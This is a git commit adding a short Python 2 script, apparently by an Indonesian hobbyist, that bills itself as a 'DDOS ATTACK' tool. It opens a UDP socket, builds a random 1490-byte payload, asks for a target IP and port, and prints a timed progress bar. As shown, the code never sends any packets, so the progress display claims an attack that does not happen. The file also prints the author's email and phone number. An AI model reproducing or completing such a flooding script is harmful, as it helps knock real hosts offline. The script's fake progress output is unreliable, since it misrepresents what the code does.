d1e362ff6d14ced6d46cdbd2f5223ef4251c772a
andacok <45217142+rayhanmaulanasugihartoputra@users.noreply.github.com>
2018-12-22 12:29:43 -0800

    Add files via upload

---
+++ anda.py
@@ -0,0 +1,42 @@
+import sys
+import os
+import time
+import socket
+import random
+
+
+#Code Time:V
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
+
+
+##########
+sock    =       socket.socket(socket.AF_INET,
+socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+##########
+os.system("clear")
+os.system("figlet DDOS ATTACK COK")
+print("Creator :Andaa")
+print("email :rayhanmaulanasp0@gmail.com")
+print("No WA :0895336892802")
+print("Teamm  :Phobia}{Ploit")
+ip = raw_input("IP Targetnya cok :")
+port = input("nah portnya deh :")
+
+os.system("clear")
+os.system("figlet Lagi nyerang cok")
+print("[=======       ]0%")
+time.sleep(5)
+print("[=========     ]25%")
+time.sleep(5)
+print("[===========    ]50%")
+time.sleep(5)
+print("[=============    ]75%")
+time.sleep(5)
+print("[===============    ]100%")
